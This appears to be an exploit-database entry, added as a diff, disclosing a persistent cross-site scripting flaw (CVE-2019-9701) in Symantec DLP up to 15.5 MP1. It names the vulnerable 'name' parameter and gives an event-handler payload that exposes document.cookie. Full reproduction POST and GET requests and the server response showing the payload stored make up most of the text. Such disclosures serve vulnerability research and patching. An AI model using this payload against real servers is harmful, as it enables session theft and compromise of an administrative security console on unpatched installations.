@@ -1,0 +1,81 @@
+# Exploit Title: Persistent XSS on Symantec DLP <= 15.5 MP1
+# Date: 2019-06-21
+# Exploit Author: Chapman Schleiss
+# Vendor Homepage: https://www.symantec.com/
+# Software Link: https://support.symantec.com/us/en/mysymantec.html
+# Version: <= 15.5 MP1
+# CVE : 2019-9701
+# Advisory-URL: https://support.symantec.com/us/en/article.SYMSA1484.html
+# Hot Fix: https://support.symantec.com/us/en/article.ALERT2664.html
+
+Description
+---------------
+Persistent XSS via 'name' param at
+/ProtectManager/enforce/admin/senderrecipientpatterns/list
+
+
+Payload: ' oNmouseover=prompt(document.domain,document.cookie) )
+Browser: Firefox 64, IE 11
+Date Observed: 15 January 2019
+
+
+Reproduction POST
+-----------------
+POST
+/ProtectManager/enforce/admin/senderrecipientpatterns/recipient_patterns/update
+HTTP/1.1
+Host: [snip].com:8443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://
+[snip].com:8443/ProtectManager/enforce/admin/senderrecipientpatterns/recipient_patterns/edit?id=41&version=30
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 558
+Connection: close
+
+name=%27+oNmouseover%3Dprompt%28document.domain%2Cdocument.cookie%29+%29&description=some_text&userPatterns=test%
+40test.com&ipAddresses=192.168.1.1&urlDomains=mail.company.com
+&id=41&version=30
+
+Reproduction GET
+----------------
+GET /ProtectManager/enforce/admin/senderrecipientpatterns/list HTTP/1.1
+Host: [snip].com:8443
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://
+[snip].com:8443/ProtectManager/enforce/admin/senderrecipientpatterns/recipient_patterns/edit?id=41&version=30
+Connection: close
+
+Reproduction Response
+---------------------
+<div id="messages-section">
+  <div class="message-pane alert-pane">
+      <div class="alert-message">
+        <div class="yui3-g message-pane-scroll">
+          <div class="yui3-u-1-24 message-icon">
+              <img src="/ProtectManager/graphics/success_icon.gif" alt="Success" width="19" height="19" />
+          </div>
+          <div class="yui3-u-11-12 wrapping-text">
+              <div id="web-status-message-163" class="message-content"> Recipient pattern '' oNmouseover=prompt(document.domain,document.cookie) )' was saved successfully.               </div>
+          </div>
+          <div class="yui3-u-1-24">
+              <div class="message-pane-actions">
+          <a href="#" class="message-back-to-element hidden action-icon">
+        <img src="/ProtectManager/graphics/general/scroll_back_16.png" alt="" title="Show affected object"/>
+          </a>
+          <a href="#" class="message-pane-close action-icon">
+        <img src="/ProtectManager/graphics/general/cancel_blue_16.png" alt=""  title="Close message bar"/>
+          </a>
+      </div>
+          </div>
+        </div>
+      </div>
+  </div>
+</div>
